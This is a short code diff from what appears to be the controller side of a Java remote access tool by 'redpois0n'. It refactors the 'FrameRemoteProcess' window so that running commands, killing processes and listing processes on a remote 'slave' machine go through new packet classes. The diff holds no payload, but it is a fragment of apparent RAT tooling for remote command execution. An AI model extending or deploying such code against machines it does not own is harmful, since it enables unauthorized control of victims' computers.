@@ -24,6 +24,9 @@ import com.redpois0n.Slave;
 import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet19ListProcesses;
+import com.redpois0n.packets.outgoing.Packet20KillProcess;
+import com.redpois0n.packets.outgoing.Packet38RunCommand;
 import com.redpois0n.ui.renderers.table.ProcessTableRenderer;
 import com.redpois0n.utils.Util;
 
@@ -81,7 +84,7 @@ public class FrameRemoteProcess extends JFrame {
 				
 				clear();
 				
-				slave.addToSendQueue(new PacketBuilder(OutgoingHeader.RUN_COMMAND, new String[] { proc }));
+				slave.addToSendQueue(new Packet38RunCommand(proc));
 							
 				list();
 			}
@@ -101,7 +104,7 @@ public class FrameRemoteProcess extends JFrame {
 					
 					clear();
 					
-					slave.addToSendQueue(new PacketBuilder(OutgoingHeader.KILL_PROCESS, new String[] { data }));				
+					slave.addToSendQueue(new Packet20KillProcess(data));				
 					
 					list();
 				}
@@ -165,7 +168,7 @@ public class FrameRemoteProcess extends JFrame {
 	}
 	
 	public void list() {
-		slave.addToSendQueue(OutgoingHeader.LIST_PROCESSES);
+		slave.addToSendQueue(new Packet19ListProcesses());
 	}
 	
 	public void clear() {
